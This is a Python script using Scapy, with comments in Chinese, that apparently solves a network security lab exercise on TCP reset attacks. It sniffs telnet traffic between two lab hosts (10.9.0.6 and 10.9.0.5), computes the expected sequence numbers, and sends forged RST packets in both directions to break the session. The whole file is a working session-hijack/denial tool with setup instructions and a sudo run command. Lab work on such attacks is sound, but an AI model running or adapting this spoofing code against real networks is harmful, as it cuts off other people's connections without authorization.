#!/usr/bin/env python3
from scapy.all import *
import sys
import subprocess

# ==================== 【配置修改】 ====================
# 目标配置不变
TARGET_SERVER = "10.9.0.5"
TARGET_CLIENT = "10.9.0.6"
TELNET_PORT = 23

# 【修改点1：手动指定接口】- 根据你的 ip addr 输出，使用网桥接口
# 将 'br-a8d4018e5d3c' 替换为你 ip addr 命令中看到的、IP为 10.9.0.1 的 br- 开头的接口名
MANUAL_IFACE = 'br-a8d4018e5d3c'

# 【修改点2：自动探测接口（备选）】- 脚本会尝试自动找到正确的接口
def find_interface():
    """尝试自动找到连接到 10.9.0.0/24 网络的接口"""
    try:
        # 使用 ip 命令列出所有接口及其IP
        result = subprocess.run(['ip', '-br', 'addr', 'show'], 
                                capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            # 寻找状态为 UP 且拥有 10.9.0.x IP 的接口
            if 'UP' in line and '10.9.0.' in line:
                iface = line.split()[0]
                print(f"[*] 自动探测到目标网络接口: {iface}")
                return iface
    except Exception as e:
        print(f"[!] 自动探测接口失败: {e}")
    # 如果自动探测失败，回退到手动的接口名
    print(f"[*] 使用手动指定的接口: {MANUAL_IFACE}")
    return MANUAL_IFACE
# ==================== 【配置结束】 ====================

def spoof_rst_packet(pkt):
    """嗅探到TCP包后，自动伪造RST包"""
    # 只处理目标客户端到服务器的包
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        tcp_sport = pkt[TCP].sport
        tcp_dport = pkt[TCP].dport
        
        # 检查是否为目标连接（client->server的telnet包）
        if (ip_src == TARGET_CLIENT and ip_dst == TARGET_SERVER 
                and tcp_dport == TELNET_PORT and pkt[TCP].flags != 'R'):
            
            print(f"[*] 捕获目标包: {ip_src}:{tcp_sport} -> {ip_dst}:{tcp_dport}")
            print(f"    序列号(seq): {pkt[TCP].seq}, 确认号(ack): {pkt[TCP].ack}")
            
            # 构造RST包（源/目与捕获包相同）
            # 使用当前包的seq，如果有payload则增加其长度
            rst_seq = pkt[TCP].seq
            if pkt[TCP].payload:
                # 计算负载字节长度，并增加（这是接收方期望的下一个seq）
                payload_len = len(pkt[TCP].payload)
                rst_seq += payload_len
            
            rst_ip = IP(src=ip_src, dst=ip_dst)
            rst_tcp = TCP(sport=tcp_sport, dport=tcp_dport, 
                         flags="R", seq=rst_seq)
            rst_pkt = rst_ip / rst_tcp
            
            print(f"[*] 伪造RST包，seq={rst_seq}")
            send(rst_pkt, verbose=0)
            print("[+] RST包已发送！连接应已断开。")
            
            # 可选：也伪造反向的RST包（server->client），确保双向断开
            # 使用捕获包中的ack号作为反向seq（通常这就是server期望的下一个seq）
            if pkt[TCP].ack:
                rst_ip_rev = IP(src=ip_dst, dst=ip_src)
                rst_tcp_rev = TCP(sport=tcp_dport, dport=tcp_sport,
                                 flags="R", seq=pkt[TCP].ack)
                rst_pkt_rev = rst_ip_rev / rst_tcp_rev
                send(rst_pkt_rev, verbose=0)
                print("[+] 反向RST包已发送（双向断开）。")
            
            return True
    return False

def main():
    print(f"[*] 开始自动RST攻击...")
    print(f"[*] 监控 {TARGET_CLIENT} -> {TARGET_SERVER}:{TELNET_PORT} 的流量")
    
    # 【修改点3：确定最终使用的接口】
    # 使用方法A：直接使用手动指定的接口（推荐，最稳定）
    use_iface = MANUAL_IFACE
    # 或者使用方法B：尝试自动探测接口
    # use_iface = find_interface()
    
    print(f"[*] 使用网络接口: {use_iface}")
    print("[*] 等待目标连接... (请确保telnet会话已建立)")
    
    # 构造BPF过滤器，只捕获我们关心的流量，减少处理负担
    bpf_filter = f"tcp and host {TARGET_CLIENT} and host {TARGET_SERVER}"
    
    # 开始嗅探，关键是指定正确的接口
    sniff(filter=bpf_filter, 
          prn=spoof_rst_packet, 
          store=0,
          iface=use_iface,  # 使用上面确定的接口
          count=0)          # 0表示持续嗅探

if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        print("\n[!] 权限错误。请使用 sudo 运行此脚本：")
        print("    sudo python3 auto_rst_attack.py")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] 用户中断。退出。")
        sys.exit(0)